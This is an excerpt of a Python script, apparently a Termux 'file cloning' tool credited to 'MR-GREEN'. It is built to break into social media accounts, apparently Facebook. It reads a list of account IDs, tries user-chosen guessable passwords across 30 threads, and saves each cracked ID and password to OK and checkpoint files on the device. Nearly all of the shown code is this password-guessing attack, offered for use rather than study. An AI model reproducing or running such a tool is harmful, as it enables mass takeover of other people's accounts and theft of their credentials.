...
{W}[{G}+{W}]---------------------------------------------- 
{W}[{G}+{W}] CREATED BY   :  \x1b[1;97mTAMIM AHMED
{W}[{G}+{W}] ON FACEBOK   :  \x1b[1;97mMR-GREEN
{W}[{G}+{W}] ON GITHUB    :  \x1b[1;97mMR_GREEN3
{W}[{G}+{W}] TOOL STATUS  :  \x1b[1;97mFILE CLONING 
{W}[{G}+{W}] TOOL VIRSION :  \x1b[1;97m1.2 / {B}PREMIUM
{W}[{G}+{W}]----------------------------------------------""")
def line():
        print(f'{W}[{G}+{W}]----------------------------------------------')
def clear():
...
def menu():
        try:
                ...
                x = ("sex")
                if x == ("sex"):
                        print(f'{W}[{G}1{W}] File cloning\n{W}[{G}0{W}] Exit menu')
                        line()
                        xd=input(f'{W}[{G}+{W}] Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(f'{W}[{G}+{W}] PUT FILE EXAMPLE:  /sdcard/File.txt  etc..')
                                line()
                                file = input(f'{W}[{G}+{W}] FILE LOCATION\033[1;97m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{W}[{G}+{W}] File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                line()
                                ...
                                line()
                                mthd=input(f'{W}[{G}+{W}] Choose: ')
                                line()
                                plist = []
                                try:
                                        ps_limit = int(input(f'{W}[{G}+{W}] How many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                line()
                                print(f'{W}[{G}+{W}] exp: first last,firtslast,first123')
                                line()
                                for i in range(ps_limit):
                                        plist.append(input(f'{W}[{G}+{W}] PUT PASSWORD {i+1}: '))
                                line()
                                print(f'{W}[{G}+{W}] Do you went show cp account? (y/n): ')
                                line()
                                cx=input(f'{W}[{G}+{W}] Choose: ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f'{W}[{G}+{W}] TOTAL IDS: \033[1;97m'+total_ids+f' \033[1;33m\033[1;36m ')
                                        print(f"{W}[{G}+{W}] USE FLIGHT MODE FOR SPEED UP\033[1;37m")
                                        line()
                                        for user in fo:
                                ...
                                print('\033[1;97m')
                                line()
                                print(f'{W}[{G}+{W}] THE PROCESS HAS COMPLETED')
                                print(f'{W}[{G}+{W}] TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                line()
                                input(f'{W}[{G}+{W}] PRESS ENTER TO BACK ')
                                os.system('python X-PRO.py')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Sk:
                                ...
                                print('\r\r\033[1;32m MR-GREEN-OK %s | %s'%(ids,pas))
                                open('/sdcard/MR-GREEN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Sk:
                                if 'y' in pcp:
                                        print('\r\033[1;91m MR-GREEN-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR-GREEN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m MR-GREEN-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR-GREEN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mMR-GREEN-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR-GREEN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MR-GREEN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m MR-GREEN-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MR-GREEN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mMR-GREEN-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR-GREEN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
